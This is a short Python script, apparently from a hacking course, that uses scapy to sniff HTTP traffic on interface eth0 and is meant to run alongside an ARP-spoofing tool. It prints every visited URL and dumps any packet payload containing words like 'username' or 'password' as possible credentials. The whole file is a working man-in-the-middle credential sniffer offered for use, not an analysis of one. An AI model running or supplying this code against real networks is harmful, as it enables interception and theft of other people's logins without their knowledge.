#!/usr/bin/env python3
#--------------------------------------
# to be run concurrently with arp_spoof
#--------------------------------------
import scapy.all as scapy
#import scapy_http.http
from scapy_http import http
import argparse
import time
def get_arguments():
    parser = argparse.ArgumentParser()
    parser.add_argument("-t","--target",help="Single Target IP")
    options= parser.parse_args()
    return options

def sniff(interface):
    # no need to store the packets . prn = callback method
    scapy.sniff(iface=interface,store=False,prn=process_sniffed_packet) 

def get_url(packet):
    return packet[http.HTTPRequest].Host + packet[http.HTTPRequest].Path    

def get_login_info(packet):
    if packet.haslayer(scapy.Raw):
        load = str(packet[scapy.Raw].load) # load returns bytes
        #print(packet[scapy.Raw].load)
        keywords = ['username','user','login','password','pass']
        for k in keywords:
            if k in load:
                return load
#
def process_sniffed_packet(packet):
    if packet.haslayer(http.HTTPRequest):
        url = get_url(packet)
        print("http request >> "+ url.decode())
        #
        login_info = get_login_info(packet)
        if login_info:
            print("\n\n Possible username/password > " + login_info + "\n\n")               

#main 
sniff("eth0")




    

